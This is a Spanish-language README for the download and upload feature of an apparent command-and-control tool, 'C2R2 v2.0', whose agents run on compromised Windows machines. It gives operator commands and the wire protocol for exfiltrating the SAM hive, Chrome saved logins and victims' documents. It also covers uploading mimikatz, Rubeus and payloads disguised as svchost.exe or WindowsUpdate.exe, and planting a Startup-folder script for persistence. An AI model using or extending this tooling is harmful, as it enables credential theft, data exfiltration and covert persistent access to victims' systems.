# 📁 File Transfer - Download & Upload

## Descripción

C2R2 v2.0 ahora incluye capacidades completas de transferencia de archivos entre el servidor C2 y los agentes comprometidos. Ambas operaciones (download y upload) utilizan codificación Base64 para transferir archivos binarios de forma segura sobre TCP.

## 🔧 Características

- ✅ **Download**: Descarga archivos desde el agente comprometido al servidor C2
- ✅ **Upload**: Sube archivos desde el servidor C2 al agente comprometido
- ✅ **Base64**: Codificación/decodificación nativa (sin dependencias externas)
- ✅ **Binarios**: Soporta archivos binarios y de texto
- ✅ **Auto-directorio**: Crea automáticamente el directorio `downloads/` en el servidor
- ✅ **Feedback visual**: Indicadores coloridos del progreso de transferencia

## 📥 Download - Descargar desde agente

### Uso
```bash
# 1. Seleccionar cliente
/select 1

# 2. Descargar archivo
/download C:\Users\victim\Desktop\passwords.txt
/download C:\Windows\System32\config\SAM
/download "C:\Program Files\app\database.db"
```

### Flujo
1. Servidor envía comando `__DOWNLOAD__:ruta_del_archivo`
2. Agente lee el archivo y lo codifica en Base64
3. Agente envía: `__FILE__:nombre:tamaño:datos_base64<<END>>`
4. Servidor decodifica y guarda en `downloads/nombre`

### Salida
```
╔═══════════════════════════════════════════════════════════╗
║              📥 ARCHIVO DESCARGADO [1]
╚═══════════════════════════════════════════════════════════╝

  📄 Archivo: passwords.txt
  📊 Tamaño: 4523 bytes
  💾 Guardado: downloads/passwords.txt
```

## 📤 Upload - Subir al agente

### Uso
```bash
# 1. Seleccionar cliente
/select 1

# 2. Subir archivo
/upload payload.exe C:\Users\Public\svchost.exe
/upload mimikatz.exe C:\Windows\Temp\tools.exe
/upload script.ps1 C:\Users\victim\Documents\update.ps1
```

### Flujo
1. Servidor lee archivo local y lo codifica en Base64
2. Servidor envía: `__UPLOAD__:ruta_destino:datos_base64`
3. Agente decodifica los datos
4. Agente escribe el archivo en la ruta especificada
5. Agente responde: `__SUCCESS__:Archivo guardado en ruta<<END>>`

### Salida
```
╔═══════════════════════════════════════════════════════════╗
║              📤 SUBIENDO ARCHIVO [1]
╚═══════════════════════════════════════════════════════════╝

  📄 Local: payload.exe
  🎯 Remoto: C:\Users\Public\svchost.exe
  📊 Tamaño: 73728 bytes

✅ Éxito de [1]:
─────────────────────────────────────────────────────────
Archivo guardado en C:\Users\Public\svchost.exe
─────────────────────────────────────────────────────────
```

## 🔐 Implementación Técnica

### Protocolo de Comunicación

#### Download
```
Servidor → Agente: __DOWNLOAD__:C:\path\file.txt
Agente → Servidor: __FILE__:file.txt:1024:SGVsbG8gV29ybGQ=\n<<END>>\n
```

#### Upload
```
Servidor → Agente: __UPLOAD__:C:\path\file.txt:SGVsbG8gV29ybGQ=
Agente → Servidor: __SUCCESS__:Archivo guardado en C:\path\file.txt\n<<END>>\n
```

### Base64 Encoding/Decoding

Ambos componentes (servidor y agente) implementan sus propias funciones de Base64 **sin dependencias externas**:

```rust
fn base64_encode(data: &[u8]) -> String
fn base64_decode(data: &str) -> Result<Vec<u8>, String>
```

Esto mantiene el agente ligero (~60KB) y sin dependencias.

## ⚠️ Manejo de Errores

### Errores Comunes

**Archivo no encontrado (Download)**:
```
❌ Error de [1]:
─────────────────────────────────────────────────────────
No se pudo leer el archivo: The system cannot find the file specified. (os error 2)
─────────────────────────────────────────────────────────
```

**Permiso denegado (Upload)**:
```
❌ Error de [1]:
─────────────────────────────────────────────────────────
Error guardando archivo: Access is denied. (os error 5)
─────────────────────────────────────────────────────────
```

**Archivo local inexistente (Upload)**:
```
❌ Error leyendo archivo local: No such file or directory (os error 2)
```

## 📊 Limitaciones

- **Tamaño**: No hay límite técnico, pero archivos muy grandes pueden saturar la memoria
- **Rendimiento**: Base64 aumenta el tamaño ~33%, recomendado para archivos < 50MB
- **Paths**: Usar rutas absolutas en Windows, respetar espacios con comillas
- **Permisos**: El agente necesita permisos de lectura/escritura en las rutas especificadas

## 💡 Casos de Uso

### Post-Explotación
```bash
# Exfiltrar credenciales
/download C:\Users\admin\AppData\Local\Google\Chrome\User Data\Default\Login Data

# Subir herramientas
/upload mimikatz.exe C:\Windows\Temp\m.exe
/upload Rubeus.exe C:\ProgramData\tools.exe

# Exfiltrar documentos
/download C:\Users\victim\Documents\financials.xlsx
```

### Persistence
```bash
# Subir backdoor
/upload payload.exe C:\Users\Public\WindowsUpdate.exe

# Subir script de inicio
/upload startup.bat "C:\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.bat"
```

## 🔍 Debug

Ambos componentes tienen mensajes DEBUG que se pueden ver:

**Agente** (en consola si `windows_subsystem = "console"`):
```
DEBUG: Intentando leer archivo: C:\file.txt
DEBUG: Archivo leído, 1024 bytes
DEBUG: Escribiendo 1024 bytes a C:\dest.txt
DEBUG: Archivo guardado exitosamente
```

**Servidor** (modo verbose `-v`):
```
🔄 Decodificando 1368 bytes de base64...
```

## 🎯 Próximas Mejoras

- [ ] Compresión (gzip) antes de Base64 para archivos grandes
- [ ] Chunking para archivos > 100MB
- [ ] Progress bar para transferencias largas
- [ ] Hash verification (SHA256) post-transferencia
- [ ] Wildcard support (`/download C:\Users\*\Desktop\*.txt`)
